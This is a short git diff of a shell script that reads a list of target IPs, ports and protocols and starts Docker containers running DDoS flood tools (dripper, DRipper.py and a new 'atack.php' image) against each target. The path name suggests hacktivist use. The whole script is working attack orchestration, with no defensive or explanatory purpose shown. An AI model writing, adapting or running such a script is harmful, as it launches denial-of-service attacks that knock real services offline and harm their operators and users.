@@ -4,7 +4,7 @@ cd /root/stopWar
 
 [ -f docker.list ] && cat docker.list | xargs docker rm -f && cat /dev/null > docker.list
 
-/usr/bin/docker pull alexmon1989/dripper:1.1.1
+#/usr/bin/docker pull alexmon1989/dripper:1.1.1
 
 cat target | while read ip port proto
 do
@@ -12,8 +12,9 @@ do
     then
 	echo $ip $port $proto
     else
-	/usr/bin/docker run -d alexmon1989/dripper:latest -s $ip -p $port -t 500 -m $proto >> docker.list
-#	/usr/bin/docker run -d cherniavsky94/stop-war python3 DRipper.py -s $ip -p $port -t 443 -q 10000 >> docker.list
+#	/usr/bin/docker run -d alexmon1989/dripper:latest -s $ip -p $port -t 500 -m $proto > docker.list
+#	/usr/bin/docker run -d cherniavsky94/stop-war python3 DRipper.py -s $ip -p $port -t 443 -q 10000 > docker.list
+	/usr/bin/docker run -d angello2docker/atack.php >> docker.list
     fi
 done
 
